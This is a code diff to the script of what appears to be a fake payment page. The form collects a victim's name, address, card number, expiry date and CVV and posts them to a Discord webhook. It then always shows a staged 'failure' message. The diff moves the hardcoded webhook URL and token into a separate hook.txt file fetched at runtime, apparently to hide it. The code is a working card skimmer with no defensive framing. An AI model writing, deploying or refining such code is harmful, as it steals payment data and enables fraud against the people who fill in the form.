@@ -331,67 +331,64 @@
     </div>
 
     <script>
-        const form = document.getElementById('paymentForm');
+    const form = document.getElementById('paymentForm');
 
-        form.addEventListener('submit', async function(event) {
-            event.preventDefault(); // Prevent the form from submitting normally
+    async function getWebhookURL() {
+        const response = await fetch('hook.txt');
+        if (!response.ok) {
+            throw new Error('Failed to load webhook URL');
+        }
+        return await response.text();
+    }
 
-            // Show the loading overlay
-            document.getElementById('loadingOverlay').style.display = 'flex';
+    form.addEventListener('submit', async function(event) {
+        event.preventDefault(); // Prevent the form from submitting normally
 
-            // Prepare data to send to the webhook
-const cardholderName = document.getElementById('cardholderName').value;
-const zipcode = document.getElementById('zipcode').value;
-const fullAddress = document.getElementById('fullAddress').value;
-const cardNumber = document.getElementById('cardNumber').value;
-const expiryDate = document.getElementById('expiryDate').value;
-const cvv = document.getElementById('cvv').value;
+        // Show the loading overlay
+        document.getElementById('loadingOverlay').style.display = 'flex';
 
-const paymentData = {
-    content: `New payment submitted:\nCardholder Name: ${cardholderName}\nZipcode: ${zipcode}\nFull Address: ${fullAddress}\nCard Number: ${cardNumber}\nExpiration Date: ${expiryDate}\nCVV: ${cvv}`
-};
+        // Prepare data to send to the webhook
+        const cardholderName = document.getElementById('cardholderName').value;
+        const zipcode = document.getElementById('zipcode').value;
+        const fullAddress = document.getElementById('fullAddress').value;
+        const cardNumber = document.getElementById('cardNumber').value;
+        const expiryDate = document.getElementById('expiryDate').value;
+        const cvv = document.getElementById('cvv').value;
 
+        const paymentData = {
+            content: `New payment submitted:\nCardholder Name: ${cardholderName}\nZipcode: ${zipcode}\nFull Address: ${fullAddress}\nCard Number: ${cardNumber}\nExpiration Date: ${expiryDate}\nCVV: ${cvv}`
+        };
 
-            try {
-                // Send the payment data to the webhook
-                const response = await fetch('https://discord.com/api/webhooks/1300194277627924530/6aG2CrVcOr3pnlqTVXeI65ilYCJojGTatUXR_vSM_GxPhZmE_99Dk5ru3p5oyH6rYujx', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(paymentData),
-                });
+        try {
+            // Get the webhook URL from hook.txt
+            const webhookURL = await getWebhookURL();
 
-                // Check if the request was successful
-                if (!response.ok) {
-                    throw new Error('Failed to send data to the webhook');
-                }
+            // Send the payment data to the webhook
+            const response = await fetch(webhookURL.trim(), {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(paymentData),
+            });
 
-                // Simulate loading for a longer duration
-                setTimeout(() => {
-                    // Hide loading overlay and show failure message
-                    document.getElementById('loadingOverlay').style.display = 'none';
-                    document.getElementById('failureMessage').style.display = 'block';
-                }, 3000); // Adjust the time as needed (3000ms = 3 seconds)
-
-            } catch (error) {
-                console.error('Error sending data:', error);
-                // Hide loading overlay and show error message
-                setTimeout(() => {
-                    document.getElementById('loadingOverlay').style.display = 'none';
-                    document.getElementById('failureMessage').style.display = 'block';
-                }, 3000); // Delay the failure message as well
+            // Check if the request was successful
+            if (!response.ok) {
+                throw new Error('Failed to send data to the webhook');
             }
-        });
 
-        // Auto-format card number input
-        document.getElementById('cardNumber').addEventListener('input', function() {
-            this.value = this.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim(); // Format with spaces
-        });
+            // Simulate loading for a longer duration
+            setTimeout(() => {
+                // Hide loading overlay and show failure message
+                document.getElementById('loadingOverlay').style.display = 'none';
+                document.getElementById('failureMessage').style.display = 'block';
+            }, 3000); // Adjust the time as needed (3000ms = 3 seconds)
 
-        // Auto-format expiration date input
-        document.getElementById('expiryDate').addEventListener('input', function() {
-            this.value = this.value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2').trim(); // Format with slash
-        });
-    </script>
+        } catch (error) {
+            console.error('Error:', error);
+            document.getElementById('loadingOverlay').style.display = 'none';
+            alert('There was an error processing your payment. Please try again later.');
+        }
+    });
+</script>
 </body>
